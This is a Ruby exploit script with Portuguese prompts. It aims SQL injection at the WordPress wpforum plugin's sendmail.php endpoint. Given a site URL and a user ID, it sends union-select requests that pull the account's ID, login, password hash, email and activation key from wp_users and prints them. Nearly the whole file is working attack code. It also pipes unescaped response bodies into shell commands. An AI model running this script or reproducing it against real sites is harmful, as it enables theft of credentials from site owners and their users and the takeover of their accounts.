require 'net/http'
system ("clear")
banner = '''
3Xpl01T b0X By:
       .__    ____        _____  
  _____|  |__/_   |__  __/  |  | 
 /  ___/  |  \|   \  \/ /   |  |_
 \___ \|   Y  \   |\   /    ^   /
/____  >___|  /___| \_/\____   | 
     \/     \/              |__| 

'''

puts "\033[31m#{banner}\033[0m"

#print "Digite o site ex (www.site.com) : "
#url = gets.chomp
print "\033[37mDigite o link do site ex :(http://www.site.com) : \033[0m"
url = gets.chomp
print "\033[37mDigite o ID da conta preferencial : \033[0m"
id_escolha = gets.chomp.to_i
url_injection_id = "#{url}/wordpress/wp-content/plugins/wpforum/sendmail.php?action=quote&id= -1 union all select ID,2,3 from  wp_users where id=#{id_escolha}"
url_injection_login = "#{url}/wordpress/wp-content/plugins/wpforum/sendmail.php?action=quote&id= -1 union all select user_login,2,3 from  wp_users where id=#{id_escolha}"
url_injection_pass = "#{url}/wordpress/wp-content/plugins/wpforum/sendmail.php?action=quote&id= -1 union all select user_pass,2,3 from  wp_users where id=#{id_escolha}"
url_injection_email = "#{url}/wordpress/wp-content/plugins/wpforum/sendmail.php?action=quote&id= -1 union all select user_email,2,3 from  wp_users where id=#{id_escolha}"
url_injection_key = "#{url}/wordpress/wp-content/plugins/wpforum/sendmail.php?action=quote&id= -1 union all select user_activation_key,2,3 from  wp_users where id=#{id_escolha}"
#url2 = [ url_injection_id] #{url_injection_login}","#{url_injection_pass}","#{url_injection_email}", "#{url_injection_key}" ]

resp = Net::HTTP.get_response(URI.parse(url_injection_id))
resp2 = Net::HTTP.get_response(URI.parse(url_injection_login))
resp3 = Net::HTTP.get_response(URI.parse(url_injection_pass))
resp4 = Net::HTTP.get_response(URI.parse(url_injection_email))
resp5 = Net::HTTP.get_response(URI.parse(url_injection_key))
if (resp.code != 200)
resp_text = resp.body
resp2_text = resp2.body
resp3_text = resp3.body
resp4_text = resp4.body
resp5_text = resp5.body
print "-\n\033[40m-------------Site-----------------------------------------------------------\033[0m\n"
print " \n \033[37m#{url}\n\n Ignore o codigo '&lt;/blockquote&gt;' em vermelho\033[0m"
print "\n\n\033[40m---------------ID-----------------------------------------------------------\033[0m\n\n"
system "echo '\033[37m#{resp_text}' | grep --color  '&lt;/blockquote&gt;'  " # Filtro da requisição html
print "\n\033[40m--------------LOGIN---------------------------------------------------------\033[0m\n\n"
system "echo '#{resp2_text}' | grep --color '&lt;/blockquote&gt;'  "
print "\n\033[40m--------------SENHA---------------------------------------------------------\033[0m\n\n"
system "echo '#{resp3_text}' | grep --color '&lt;/blockquote&gt;'  "
print "\n\033[40m--------------EMAIL---------------------------------------------------------\033[0m\n\n"
system "echo '#{resp4_text}' | grep --color '&lt;/blockquote&gt;'  "
print "\n\033[40m---------KEY DE RECUPERACAO-------------------------------------------------\033[0m\n\n"
system "echo '#{resp5_text}' | grep --color '&lt;/blockquote&gt;'  "
print "\n\033[40m----------------------------------------------------------------------------\033[0m\n\n"
else
print "Site nao vulneravel"
end
